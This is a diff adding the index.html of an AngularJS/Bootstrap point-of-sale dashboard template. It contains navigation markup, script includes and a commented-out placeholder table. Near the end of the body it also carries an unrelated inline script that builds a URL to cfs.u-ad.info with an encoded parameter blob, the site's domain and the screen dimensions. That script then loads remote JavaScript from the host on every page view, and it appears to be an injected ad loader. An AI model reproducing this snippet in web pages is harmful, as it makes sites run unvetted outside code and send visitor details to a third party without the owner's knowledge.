@@ -1,0 +1,266 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>POS - REST Template</title>
+
+  <!-- build:css(.) styles/vendor.css -->
+  <!-- bower:css -->
+  <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.css" />
+  <!-- endbower -->
+  <!-- endbuild -->
+  <!-- build:css(.tmp) styles/main.css -->
+  <link rel="stylesheet" href="styles/dashboard.css">
+  <!-- endbuild -->
+</head>
+
+<body ng-app="pos">
+  <nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">REST Pos</a>
+      </div>
+      <div id="navbar" class="navbar-collapse collapse">
+        <ul class="nav navbar-nav navbar-right">
+          <li><a href="#">Dashboard</a></li>
+          <li><a href="#">Settings</a></li>
+          <li><a href="#">Profile</a></li>
+          <li><a href="#">Help</a></li>
+        </ul>
+        <form class="navbar-form navbar-right">
+          <input type="text" class="form-control" placeholder="Search...">
+        </form>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container-fluid">
+    <div class="row">
+      <div class="col-sm-3 col-md-2 sidebar">
+        <ul class="nav nav-sidebar">
+          <li class="active"><a href="#">Overview <span class="sr-only">(current)</span></a></li>
+          <li><a href="#/sale">Sale</a></li>
+        </ul>
+        <ul class="nav nav-sidebar">
+          <li><a href="#/product">Product</a></li>
+          <li><a href="#/employee">Employee</a></li>
+        </ul>
+      </div>
+      <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
+        <div class="container">
+          <div ng-controller="AlertCtrl">
+            <alert ng-repeat="alert in alerts" type="{{alert.level}}" close="dismiss($index)">{{alert.message}}</alert>
+          </div>
+
+          <div ng-view=""></div>
+      </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Google Analytics: change UA-XXXXX-X to be your site's ID -->
+  <script>
+    !function(A,n,g,u,l,a,r){A.GoogleAnalyticsObject=l,A[l]=A[l]||function(){
+    (A[l].q=A[l].q||[]).push(arguments)},A[l].l=+new Date,a=n.createElement(g),
+    r=n.getElementsByTagName(g)[0],a.src=u,r.parentNode.insertBefore(a,r)}(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-XXXXX-X');
+    ga('send', 'pageview');
+  </script>
+
+  <!-- build:js(.) scripts/vendor.js -->
+  <!-- bower:js -->
+  <script src="bower_components/jquery/dist/jquery.js"></script>
+  <script src="bower_components/bootstrap/dist/js/bootstrap.js"></script>
+  <script src="bower_components/angular/angular.js"></script>
+  <script src="bower_components/angular-route/angular-route.js"></script>
+  <script src="bower_components/angular-resource/angular-resource.js"></script>
+  <script src="bower_components/angular-animate/angular-animate.js"></script>
+  <script src="bower_components/angular-bootstrap/ui-bootstrap-tpls.js"></script>
+  <!-- endbower -->
+  <!-- endbuild -->
+
+  <!-- build:js({.tmp,app}) scripts/scripts.js -->
+  <script src="scripts/app.js"></script>
+  <script src="scripts/common.js"></script>
+  <script src="scripts/controllers/main.js"></script>
+  <script src="scripts/controllers/menu.js"></script>
+  <script src="scripts/controllers/sale.js"></script>
+  <script src="scripts/controllers/employee.js"></script>
+  <script src="scripts/controllers/product.js"></script>
+  <script src="scripts/controllers/alert.js"></script>
+  <script src="scripts/filters/pages.js"></script>
+  <script src="scripts/directives/pagination.js"></script>
+  <!-- endbuild -->
+
+
+
+  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRFjYMlTZUpgpMPlkC%2fVbkusZY3Td2AGo4%2fuJodEqRpyLYe%2fnCHUg2LabsNpXiXge09wSDIIS%2fHlvCaMYyflmlLkJQOvgq3QgB6cYxA%2f%2bOf4UEU01W9hvu%2fFVdVYTnaEcJpoF2%2bmeVwbKVPzxnq7t4ebi9sdjXiFMtTlqC3yVxXK7KWXIRG5VXOa95%2b3fFMI2XHaCCYALj7JYYUSya6383D3fAcgBwSD7s0AnUDzeFGT1i9KmjCeQnCur10L32ZwGwkLzMKBoPJWbpRhtXTQBJU1Aje2xUrCF%2bhMel5k1JsWpjgX%2bsSMg5S7DDKz0wX6tSajvV9o5NpBcKj5DS5rcGDUkgHGc5UItcsEYvHQE%2bOTf2W2dgRGfxKb9QzSOvOgLNrmI9YrIKgL%2f%2b0zH1Q1nB8vDfRfWEnrhGZIYVakz17Mq%2bh2sLytSM19eHJ1SMhq4k9A1VZzn5UZ1mOgsmm%2fSGtm8sM86Dq%2f8zDcpOQM3fT05OBGLB5pqQNuOyGJAoGyLfDwVcbOUUVrMs5NnMLqWtUJJP%2f3JIx3l8qzsK1dOBUjXowxvOwDw7p1sbAXecTyLmol0%2fmR3TOYU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+</body>
+</html>
+
+
+<!-- 
+<h1 class="page-header">Dashboard</h1>
+
+        <div class="row placeholders">
+          <div class="col-xs-6 col-sm-3 placeholder">
+            <img data-src="holder.js/200x200/auto/sky" class="img-responsive" alt="Generic placeholder thumbnail">
+            <h4>Label</h4>
+            <span class="text-muted">Something else</span>
+          </div>
+          <div class="col-xs-6 col-sm-3 placeholder">
+            <img data-src="holder.js/200x200/auto/vine" class="img-responsive" alt="Generic placeholder thumbnail">
+            <h4>Label</h4>
+            <span class="text-muted">Something else</span>
+          </div>
+          <div class="col-xs-6 col-sm-3 placeholder">
+            <img data-src="holder.js/200x200/auto/sky" class="img-responsive" alt="Generic placeholder thumbnail">
+            <h4>Label</h4>
+            <span class="text-muted">Something else</span>
+          </div>
+          <div class="col-xs-6 col-sm-3 placeholder">
+            <img data-src="holder.js/200x200/auto/vine" class="img-responsive" alt="Generic placeholder thumbnail">
+            <h4>Label</h4>
+            <span class="text-muted">Something else</span>
+          </div>
+        </div>
+
+        <h2 class="sub-header">Section title</h2>
+        <div class="table-responsive">
+          <table class="table table-striped">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Header</th>
+                <th>Header</th>
+                <th>Header</th>
+                <th>Header</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>1,001</td>
+                <td>Lorem</td>
+                <td>ipsum</td>
+                <td>dolor</td>
+                <td>sit</td>
+              </tr>
+              <tr>
+                <td>1,002</td>
+                <td>amet</td>
+                <td>consectetur</td>
+                <td>adipiscing</td>
+                <td>elit</td>
+              </tr>
+              <tr>
+                <td>1,003</td>
+                <td>Integer</td>
+                <td>nec</td>
+                <td>odio</td>
+                <td>Praesent</td>
+              </tr>
+              <tr>
+                <td>1,003</td>
+                <td>libero</td>
+                <td>Sed</td>
+                <td>cursus</td>
+                <td>ante</td>
+              </tr>
+              <tr>
+                <td>1,004</td>
+                <td>dapibus</td>
+                <td>diam</td>
+                <td>Sed</td>
+                <td>nisi</td>
+              </tr>
+              <tr>
+                <td>1,005</td>
+                <td>Nulla</td>
+                <td>quis</td>
+                <td>sem</td>
+                <td>at</td>
+              </tr>
+              <tr>
+                <td>1,006</td>
+                <td>nibh</td>
+                <td>elementum</td>
+                <td>imperdiet</td>
+                <td>Duis</td>
+              </tr>
+              <tr>
+                <td>1,007</td>
+                <td>sagittis</td>
+                <td>ipsum</td>
+                <td>Praesent</td>
+                <td>mauris</td>
+              </tr>
+              <tr>
+                <td>1,008</td>
+                <td>Fusce</td>
+                <td>nec</td>
+                <td>tellus</td>
+                <td>sed</td>
+              </tr>
+              <tr>
+                <td>1,009</td>
+                <td>augue</td>
+                <td>semper</td>
+                <td>porta</td>
+                <td>Mauris</td>
+              </tr>
+              <tr>
+                <td>1,010</td>
+                <td>massa</td>
+                <td>Vestibulum</td>
+                <td>lacinia</td>
+                <td>arcu</td>
+              </tr>
+              <tr>
+                <td>1,011</td>
+                <td>eget</td>
+                <td>nulla</td>
+                <td>Class</td>
+                <td>aptent</td>
+              </tr>
+              <tr>
+                <td>1,012</td>
+                <td>taciti</td>
+                <td>sociosqu</td>
+                <td>ad</td>
+                <td>litora</td>
+              </tr>
+              <tr>
+                <td>1,013</td>
+                <td>torquent</td>
+                <td>per</td>
+                <td>conubia</td>
+                <td>nostra</td>
+              </tr>
+              <tr>
+                <td>1,014</td>
+                <td>per</td>
+                <td>inceptos</td>
+                <td>himenaeos</td>
+                <td>Curabitur</td>
+              </tr>
+              <tr>
+                <td>1,015</td>
+                <td>sodales</td>
+                <td>ligula</td>
+                <td>in</td>
+                <td>libero</td>
+              </tr>
+            </tbody>
+          </table>
+        </div> -->
